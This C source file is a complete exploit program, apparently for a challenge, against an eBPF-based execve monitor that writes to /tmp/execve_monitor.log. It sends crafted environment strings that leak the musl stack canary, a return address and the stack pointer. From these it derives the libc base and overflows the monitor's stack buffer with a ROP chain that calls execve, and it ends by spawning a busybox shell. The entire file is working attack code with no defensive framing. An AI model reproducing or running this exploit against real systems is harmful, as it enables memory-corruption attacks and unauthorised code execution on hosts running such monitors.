#define _GNU_SOURCE
#include <errno.h>       // for errno
#include <fcntl.h>       // for SEEK_END, SEEK_SET
#include <limits.h>      // for PATH_MAX
#include <stddef.h>      // for size_t, NULL, offsetof
#include <stdint.h>      // for uint64_t
#include <stdio.h>       // for fprintf, stderr, perror, fseek, fclose, fopen
#include <stdlib.h>      // for exit, EXIT_FAILURE, free, malloc, getenv
#include <string.h>      // for memcpy, strerror, memset, memchr, memmem
#include <sys/wait.h>    // for waitpid
#include <unistd.h>      // for execve, sleep, fork, pause, read, readlink
#include "offsets.h"     // for COOKIE_OFFSET, EVENT_OFFSET, EXECVE, LOCALS_...
#include "pwnit.skel.h"  // for pwnit_bpf__attach, pwnit_bpf__load, pwnit_bp...

extern char **environ;

#define LOG_FILE "/tmp/execve_monitor.log"

#define PRELOAD_VAR "LD_PRELOAD="
#define PRELOAD_VAR_SIZE (sizeof(PRELOAD_VAR) - 1)

#define WAIT_FOR_USER_ENV                                                      \
  "PWNIT_WAIT_FOR_USER" // Environment variable to control waiting

#define MAX_ENV_VARS 128
#define MAX_STRINGS_SIZE (1 << 13)

// Vulnerable buffer layout
struct event {
  int env_offsets[MAX_ENV_VARS];
  char strings[MAX_STRINGS_SIZE];
};

struct exploit_payload {
  char
      strings[COOKIE_OFFSET - (EVENT_OFFSET + offsetof(struct event, strings))];
  uint64_t cookie; // stack canary
  char pad[LOCALS_SIZE - COOKIE_OFFSET - sizeof(uint64_t)];
  uint64_t rbx;
  uint64_t rbp;
  uint64_t rop[8]; // return address to overwrite
} __attribute__((packed));

// Function to extract cookie and retaddr from log file
static void extract_leak_info(uint64_t *cookie, uint64_t *retaddr,
                              uint64_t *rsp, size_t skip) {
  // Wait a bit for the log to be written
  sleep(1);

  // Open the log file
  FILE *log_file = fopen(LOG_FILE, "rb");
  if (!log_file) {
    perror("Failed to open log file");
    exit(EXIT_FAILURE);
  }

  // Get file size
  if (fseek(log_file, 0, SEEK_END) < 0) {
    perror("Failed to seek to end of log file");
    exit(EXIT_FAILURE);
  }
  long file_size = ftell(log_file);
  if (file_size < 0) {
    perror("Failed to get file size");
    exit(EXIT_FAILURE);
  }
  if (fseek(log_file, 0, SEEK_SET) < 0) {
    perror("Failed to seek to start of log file");
    exit(EXIT_FAILURE);
  }

  // Allocate memory for the entire log file
  char *log_data = malloc(file_size);
  if (!log_data) {
    perror("Failed to allocate memory for log data");
    exit(EXIT_FAILURE);
  }
  void *log_end = log_data + file_size;

  // Read the entire file into memory
  size_t bytes_read = fread(log_data, 1, file_size, log_file);
  fclose(log_file);

  if (bytes_read != (size_t)file_size) {
    fprintf(stderr,
            "Failed to read entire log file: expected %ld bytes, got %zu\n",
            file_size, bytes_read);
    exit(EXIT_FAILURE);
  }

  // Search for "attempt ===\n" pattern
  // Use memmem instead of manual loop with memcmp
  const char *pattern = "attempt ===\n";
  const size_t pattern_len = strlen(pattern);
  void *p = memmem(log_data, file_size, pattern, pattern_len);
  if (!p) {
    fprintf(stderr, "Failed to find leak information in log file\n");
    exit(EXIT_FAILURE);
  }
  p += pattern_len;

  // Parse cookie
  // musl libc's stack canary property: second byte is always 0
  // This is set in musl's __init_ssp function to prevent
  // leaking/overwriting the canary via string manipulation functions
  p += skip;
  memcpy(cookie, p, sizeof(*cookie));
  fprintf(stderr, "raw cookie: 0x%lx\n", *cookie);
  if (((*cookie >> 8) & 0xff) != 0xa) {
    fprintf(stderr, "Second cookie byte is not 0xa\n");
    exit(EXIT_FAILURE);
  }
  *cookie &= 0xffffffffffff00ff;
  fprintf(stderr, "cookie: 0x%lx\n", *cookie);
  p += sizeof(*cookie);

  // Find the newline after the cookie
  p = memchr(p, '\n', log_end - p);
  if (!p) {
    fprintf(stderr, "Failed to parse retaddr from log\n");
    exit(EXIT_FAILURE);
  }
  p++;
  memcpy(retaddr, p, sizeof(*retaddr));
  fprintf(stderr, "raw retaddr: 0x%lx\n", *retaddr);
  if (((*retaddr >> 48) & 0xff) != 0x0a) {
    fprintf(stderr, "7th retaddr byte is not 0x0a\n");
    exit(EXIT_FAILURE);
  }
  *retaddr &= 0x0000ffffffffffff;
  fprintf(stderr, "retaddr: 0x%lx\n", *retaddr);
  p += 7;

  memcpy(rsp, p, sizeof(*rsp));
  fprintf(stderr, "raw rsp: 0x%lx\n", *rsp);
  if (((*rsp >> 48) & 0xff) != 0x0a) {
    fprintf(stderr, "7th rsp byte is not 0x0a\n");
    exit(EXIT_FAILURE);
  }
  *rsp &= 0x0000ffffffffffff;
  fprintf(stderr, "rsp: 0x%lx\n", *rsp);

  free(log_data);
}

static void spawn_with_payload(void *payload, size_t payload_size) {
  // Count the number of null-terminated strings in the payload
  int str_count = 0;

  // First pass: count the number of strings
  for (size_t i = 0; i < payload_size; i++) {
    // If we find a null byte, it's the end of a string
    if (((const char *)payload)[i] == '\0') {
      str_count++;
    }
  }
  fprintf(stderr, "str_count: %d\n", str_count);

  // Allocate memory for the environment array
  // First string is used as pathname, so we need str_count entries (this
  // includes the NULL terminator)
  char **envp = malloc(str_count * sizeof(char *));
  if (!envp) {
    perror("malloc");
    exit(EXIT_FAILURE);
  }

  // Second pass: fill the environment array
  int str_index = 0;
  size_t start = 0;
  const char *pathname = NULL;

  for (size_t i = 0; i < payload_size; i++) {
    // If we find a null byte, it's the end of a string
    if (((char *)payload)[i] == '\0') {
      if (str_index == 0) {
        // First string is the pathname
        pathname = &((char *)payload)[start];
      } else {
        // Add the string to the environment array
        envp[str_index - 1] = &((char *)payload)[start];
      }
      str_index++;
      start = i + 1; // Next string starts after this null byte
    }
  }

  // NULL-terminate the environment array
  envp[str_index - 1] = NULL;

  pid_t child = fork();
  if (child == -1) {
    perror("fork");
    exit(EXIT_FAILURE);
  }

  if (child == 0) {
    // Child process
    char *args[] = {NULL}; // Empty args array
    execve(pathname, args, envp);
    perror("execve");
    exit(EXIT_FAILURE);
  }

  // Free the environment array
  free(envp);

  // Wait for the child to complete
  waitpid(child, NULL, 0);
}

// Add a new function to wait for user input if the environment variable is set
static void maybe_wait_for_user(const char *message) {
  if (getenv(WAIT_FOR_USER_ENV) != NULL) {
    fprintf(stderr, "%s (press Enter to continue)...", message);
    char c;
    ssize_t ret = read(STDIN_FILENO, &c, 1);
    if (ret < 0) {
      perror("read from stdin");
      exit(EXIT_FAILURE);
    } else if (ret == 0) {
      fprintf(stderr, "Unexpected EOF when reading from stdin\n");
      exit(EXIT_FAILURE);
    }
  }
}

// Function to load and attach the BPF program
static void load_and_attach_bpf(void) {
  int err;
  struct pwnit_bpf *bpf_skel = NULL;

  // Open the BPF program
  bpf_skel = pwnit_bpf__open();
  if (!bpf_skel) {
    fprintf(stderr, "Error opening BPF skeleton: %s\n", strerror(errno));
    return;
  }

  // Load the BPF program
  err = pwnit_bpf__load(bpf_skel);
  if (err) {
    fprintf(stderr, "Error loading BPF skeleton: %s\n", strerror(errno));
    return;
  }

  // Attach the program
  err = pwnit_bpf__attach(bpf_skel);
  if (err) {
    fprintf(stderr, "Error attaching BPF skeleton: %s\n", strerror(errno));
    return;
  }

  fprintf(stderr, "Successfully loaded and attached BPF program\n");
  while (1) {
    pause();
  }
}

int main(void) {
  // Try to load and attach the BPF program
  load_and_attach_bpf();

  // Get the full path of the current executable from /proc/self/exe
  char full_path[PATH_MAX];
  ssize_t len = readlink("/proc/self/exe", full_path, PATH_MAX - 1);
  if (len == -1) {
    perror("readlink");
    exit(EXIT_FAILURE);
  }
  full_path[len] = '\0'; // Ensure null termination
  fprintf(stderr, "Full path to executable: %s\n", full_path);

  // Create zeroed payload
  struct exploit_payload payload = {};

  // Leak cookie, libc base and rsp
  // musl libc's stack canary's second byte is always 0
  // This is set in musl's __init_ssp function to prevent
  // leaking/overwriting the canary via string manipulation functions
  ((int *)payload.strings)[0] = offsetof(struct exploit_payload, cookie);
  ((int *)payload.strings)[1] = offsetof(struct exploit_payload, cookie) + 2;
  ((int *)payload.strings)[2] = offsetof(struct exploit_payload, rop);
  ((int *)payload.strings)[3] = PTRPTR_MINUS_EVENT - offsetof(struct event, strings);
  ((int *)payload.strings)[4] = 0;

  // Make sure payload triggers monitor
  memcpy(&((int *)payload.strings)[5], PRELOAD_VAR, PRELOAD_VAR_SIZE);

  // Calculate payload length so that we have exactly MAX_ENV_VARS + 1 strings
  // (pathname + environment variables)
  size_t leak_payload_size = 0, n_env_vars = 0;
  while (n_env_vars <= MAX_ENV_VARS) {
    if (payload.strings[leak_payload_size] == '\0') {
      n_env_vars++;
    }
    leak_payload_size++;
  }
  fprintf(stderr, "leak_payload_size: %zu\n", leak_payload_size);

  // Trigger the leak
  spawn_with_payload(&payload, leak_payload_size);

  // Extract cookie and retaddr from log file
  uint64_t cookie = 0;
  uint64_t retaddr = 0;
  uint64_t rsp = 0;
  extract_leak_info(&cookie, &retaddr, &rsp, leak_payload_size - 3);

  uint64_t libbpf_base = retaddr - RET_FROM_HANDLE_EVENT;
  fprintf(stderr, "libbpf_base: 0x%lx\n", libbpf_base);
  uint64_t libc_base = libbpf_base + SIZEOF_LIBBPF + 0x6000;
  fprintf(stderr, "libc_base: 0x%lx\n", libc_base);
  uint64_t strings = rsp - PTR_MINUS_EVENT + offsetof(struct event, strings);
  fprintf(stderr, "strings: 0x%lx\n", strings);

  // Prepare the overflow payload
  memset(&payload, 'A', sizeof(payload));
  // argv + envp for execve() ROP chain
  memset(payload.strings, 0, 8);
  // Monitor trigger + full path for execve ROP chain
  sprintf(&payload.strings[8], PRELOAD_VAR "%s", full_path);
  payload.cookie = cookie;
  payload.rop[0] = libc_base + POP_RDI_RET;
  payload.rop[1] = strings + 8 + PRELOAD_VAR_SIZE;
  payload.rop[2] = libc_base + POP_RSI_RET;
  payload.rop[3] = strings;
  payload.rop[4] = libc_base + POP_RDX_RET;
  payload.rop[5] = strings;
  payload.rop[6] = libc_base + RET; // Align the stack
  payload.rop[7] = libc_base + EXECVE;

  // Wait for user input before sending the exploit payload if requested
  maybe_wait_for_user("About to send exploit payload");

  // Spawn child to trigger the exploit
  spawn_with_payload(&payload, sizeof(payload));

  // Wait for user input after sending the exploit payload if requested
  maybe_wait_for_user("Exploit payload sent");

  // Give stage2 a chance to run
  sleep(1);

  // Put strings on stack
  char busybox_path[] = "/bin/busybox";
  char sh_cmd[] = "sh";

  // Set up arguments for execve
  char *args[] = {busybox_path, sh_cmd, NULL};
  execve(busybox_path, args, environ);

  // If execve fails, print error and exit
  perror("execve");
  exit(EXIT_FAILURE);
}
